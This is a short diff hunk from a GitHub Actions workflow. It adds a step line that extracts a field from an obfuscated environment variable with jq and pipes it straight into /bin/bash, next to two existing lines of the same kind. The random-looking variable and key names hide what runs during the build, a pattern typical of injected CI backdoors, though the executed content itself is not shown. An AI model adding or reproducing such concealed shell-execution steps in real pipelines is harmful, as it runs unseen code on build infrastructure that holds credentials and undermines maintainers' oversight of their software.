@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$oh482" | jq -r .ctvl26738 | /bin/bash
           echo $lwhaq55195 | jq -r .hvy1 | /bin/bash
+          echo $lyimm261 | jq -r .bu354 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
